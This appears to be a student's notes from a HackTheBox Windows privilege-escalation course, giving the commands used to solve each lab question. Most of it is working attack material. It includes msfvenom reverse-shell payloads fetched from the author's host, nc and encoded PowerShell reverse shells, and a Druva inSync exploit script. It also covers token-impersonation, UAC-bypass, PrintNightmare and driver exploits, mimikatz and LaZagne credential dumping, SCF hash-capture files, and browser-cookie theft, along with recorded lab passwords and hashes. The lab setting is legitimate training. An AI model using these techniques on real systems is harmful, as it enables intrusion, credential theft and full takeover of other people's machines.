# Windows Privilege Escalation


What is the IP address of the other NIC attached to the target host? 


```bash

ipconfig /all

```


What executable other than cmd.exe is blocked by AppLocker? 

```powershell

 Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\*\*\*\*\*.exe -User Everyone | findstr "Denied"

```



# Initial Enumeration

What non-default privilege does the htb-student user have? 

```powershell

whoami /priv

```
Who is a member of the Backup Operators group? 

```powershell

Get-LocalGroupMember -Group "Backup Operators"

```

What service is listening on port 8080 (service name not the executable)? 
```powershell

netstat -ano | findstr "8080"

tasklist /svc | findstr "2304" 

```

What user is logged in to the target host? 
What type of session does this user have?

```powershell

query user

```

# Communication with Processes

What service is listening on 0.0.0.0:21? (two words) 

```

```

Which account has WRITE_DAC privileges over the \pipe\SQLLocal\SQLEXPRESS01 named pipe? 

```powershell

certutil.exe -urlcache -split -f http://10.10.14.42:8000/accesschk.exe accesschk.exe 

Invoke-WebRequest https://10.10.14.42:8000/accesschk.exe


```


# SeImpersonate and SeAssignPrimaryToken

Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt 

```powershell 
whoami /priv

mssqlclient.py sql_dev@10.129.43.30 -windows-auth

xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```

# SeDebugPrivilege

Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account. 

write-up: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

```powershell

crackmapexec smb 10.129.244.124 -u 'jordan' -p 'HTB_@cademy_j0rdan!' --shares 



whoami /priv

# on windows share set the file like @shell.scf
[Shell]
Command=2
IconFile=\\10.10.14.42\share
[Taskbar]
Command=ToggleDesktop

# msfconsole run smb server/capture/smb

hashcat -m 5600 hash.txt /home/avataris12/CTF/CTF_2023/desconstru_ctf/Forensics/Hash_Roll/rockyou.txt

# tasckmanager

./minikartz

sekurlsa::logonpasswords

sekurlsa::minidump  C:\Users\sccm_svc\AppData\Local\Temp\lsass.DMP



```

# SeTakeOwnershipPrivilege

Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents. 


``` powershell

PS C:\tools> Import-Module .\Enable-Privilege.ps1
PS C:\tools> .\EnableAllTokenPrivs.ps1
PS C:\tools> whoami /priv

icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

takeown /f flag.txt

type .\flag.txt


```

# Windows Built-in Groups

Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt 

```powershell

PS C:\tools> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\tools> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\tools> Set-SeBackupPrivilege
PS C:\tools> Get-SeBackupPrivilege

Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt



```

# Event Log Readers

Using the methods demonstrated in this section find the password for the user mary. 



```powershell

wevtutil qe Security /rd:true /f:text | Select-String "/mary"


```


# DnsAdmins


```powershell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=1234 --platform windows  -f dll -o shell.dll

wget "http://10.10.14.3:7777/shell.dll" -outfile "shell.dll"

dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\shell.dll

sc stop dns

sc start dns



```


# Print Operators


```powershell


EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

.\ExploitCapcom.exe


```



# Server Operators

Escalate privileges using the methods shown in this section and submit the contents of the flag located at c:\Users\Administrator\Desktop\ServerOperators\flag.txt 

```powershell

sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

net localgroup Administrators

crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!' --ntds


evil-winrm -i 10.129.43.42 -u 'Administrator' -H 7796ee39fd3a9c3a1844556115ae1a54


```

# User Account Control

Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished.

```powershell


whoami /user

net localgroup administrators

whoami /priv

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

[environment]::OSVersion.Version

cmd /c echo %PATH%

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.51 LPORT=8443 -f dll > srrstr.dll

sudo python3 -m http.server 8080

curl http://10.10.16.51:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

nc -lvnp 8443

rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll


```

# Weak Permissions

Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop.

#### https://steflan-security.com/windows-privilege-escalation-weak-permission/

```powershell
# We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

#Enumeration
.\SharpUp.exe audit

accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Stopped
  StartMode        : Auto
  PathName         : C:\Users\htb-student\SecurityService.exe




msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.51 LPORT=9000 -f exe -o SecurityService.exe

Invoke-WebRequest -Uri "http://10.10.16.51:8080/WindscribeService.exe" -OutFile "C:\Users\htb-student\WindscribeService.exe"

nc -lvnp 9000

sc config "WindscribeService" binpath= "C:\Users\htb-student\SecurityService.exe"

net stop WindscribeService

net start WindscribeService

```

# Kernel Exploits

Checking Permissions on the SAM File

```powershell
# go and download the file https://github.com/GossiTheDog/HiveNightmare/blob/master/Release/HiveNightmare.exe

wget http://10.10.16.51:8080/HiveNightmare.exe -O HiveNightmare.exe  
# get SAM passwords
.\HiveNightmare.exe

xfreerdp /v:10.129.43.13 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/avataris12/HackTheBox/Windows_Privilege_Escalation

xfreerdp /v:10.129.43.13 /u:Administrator /pth:7796ee39fd3a9c3a1844556115ae1a54

 ls \\localhost\pipe\spoolss

 Set-ExecutionPolicy Bypass -Scope Process

 Import-Module .\CVE-2021-1675.ps1

 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

 net user hacker

 # start a powershell administrive privilege with this user because have in lovcal group of administrator

```


# Vulnerable Services


```powershell 
# Enumeration
wmic product get name

get-process -Id 3324
get-service | ? {$_.DisplayName -like 'Druva*'}

# exploit


```

```powershell
# exploit run .\shell.ps1 controling the local group Administrator
$ErrorActionPreference = "Stop"

$cmd = "net localgroup Administrators htb-student /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)


```
```powershell

# to run shell.ps1 
# bypass powershell policy with this command

Set-ExecutionPolicy Bypass -Scope Process
.\shell.ps1

#another way 

# if you want to get reverse shell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Import-Module .\Invoke-PowerShellTcp.ps1

# add this to the final exploit shell.ps1 and 
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.51 -Port 9443
# and change cmd to 
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.16.51:8080/shell.ps1')"


type c:\Users\Administrator\Desktop\VulServices\flag.txt


```


# Credential Hunting



```powershell

#Enumeration
cd c:\Users

 findstr /SIM /C:"password" *.xml
 cat Public\Documents\settings.xml


```


# Other Files

Using the techniques shown in this section, find the cleartext password for the bob_adm user on the target system. 

```powershell

#Enumeration 
findstr /si password *.xml *.ini *.txt *.config


# open stick notes

#root:Vc3nt3R_adm1n!
#bob_adm:1qazXSW@3edc!

```

# Further Credential Theft

Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account

```powershell
#Enumeration

.\lazagne.exe all

#sa:S3cret_db_p@ssw0rd!
#root:Summer2020! ssh

```
Which user has credentials stored for RDP access to the WEB01 host? 
Enumerate the host and find the password for ftp.ilfreight.local 


```powershell

.\lazagne.exe all
#root:Ftpuser!
```

Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login 


```Powershell

.\SharpChrome.exe logins /unprotect

#root:ILVCadm1n1qazZAQ!

```

# Citrix Breakout

Submit the user flag from C:\Users\pmorgan\Downloads

```powershell


```


Submit the Administrator's flag from C:\Users\Administrator\Desktop 

```powershell

```


# Interacting with Users

```
name it something like @Inventory.scf

[Shell]
Command=2
IconFile=\\10.10.16.51\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

```bash

sudo responder  -v -I tun0

```


# 

Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems? 

```powershell
ls C:\Users\Peter\AppData\Roaming\mRemoteNG
#open confCons.xml

wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py 


python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
#Grace:Princess01!


```
 Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace? 

 Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag. 

```powershell
xfreerdp /v:10.129.50.132 /u:Grace /p:Princess01! /drive:shared,/home/avataris12/HackTheBox/Windows_Privilege_Escalation

wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py

copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

python3 cookieextractor.py --dbpath "/home/avataris12/HackTheBox/Windows_Privilege_Escalation/cookies.sqlite" --host slack --cookie d

# (10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)


# RDP connection set the cookie and refresh 

#jeff:Webmaster001!
```

 Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answe

 Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.

# Miscellaneous Techniques





# Windows Desktop Versions

 Enumerate the target host and escalate privileges to SYSTEM. Submit the contents of the flag on the Administrator Desktop. 

 ```powershell

Set-ExecutionPolicy bypass -scope process

Import-Module .\Invoke-MS16-032.ps1

Invoke-MS16-032

 ```


# Windows Privilege Escalation Skills Assessment - Part I

 Which two KBs are installed on the target system? (Answer format: 3210000&3210060) 


```powershell
# https://www.revshells.com/ -> powershell base64

ping gooogle.com || powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

systeminfo

```

Find the password for the ldapadmin account somewhere on the system. 



```powershell

whoami /priv
# https://juggernaut-sec.com/seimpersonateprivilege/

cd C:\users\public

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.51 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe


Invoke-WebRequest -Uri "http://10.10.16.51:8000/nc.exe" -OutFile "C:\Users\public\nc.exe"

Invoke-WebRequest -Uri "http://10.10.16.51:8000/JuicyPotato.exe" -OutFile "C:\Users\public\JuicyPotato.exe"

Invoke-WebRequest -Uri "http://10.10.16.51:8000/shell.exe" -OutFile "C:\Users\public\shell.exe"

Invoke-WebRequest -Uri "http://10.10.16.51:8000/PrintSpoofer64.exe" -OutFile "C:\Users\public\PrintSpoofer64.exe"


# https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/
# https://github.com/ohpe/juicy-potato/releases
.\JuicyPotato.exe -t * -p C:\users\public\shell.exe -l 4444 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"


Get-ChildItem -Path "C:\Users" -File -Recurse | Select-String -Pattern "password"

Get-ChildItem -Path "C:\Users" -Filter "confidential.txt" -Recurse

```

# Windows Privilege Escalation Skills Assessment - Part II



 Find left behind cleartext credentials for the iamtheadministrator domain admin account. 


```cmd

.\SharpUp.exe audit

type C:\Windows\Panther\Unattend.xml


```

Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop 

```cmd
# https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.51 LPORT=4444 -f msi -o reverse.msi

nc -lvnp 4444

# add the user to group Administrator

net localgroup Administrators /add htb-student

# run crackmapexec

crackmapexec smb 10.129.43.33  -u htb-student -p HTB_@cademy_stdnt! --sam

hashcat -m 1000 -a 0 hash_wksadmin  /usr/share/wordlists/rockyou.txt 





```


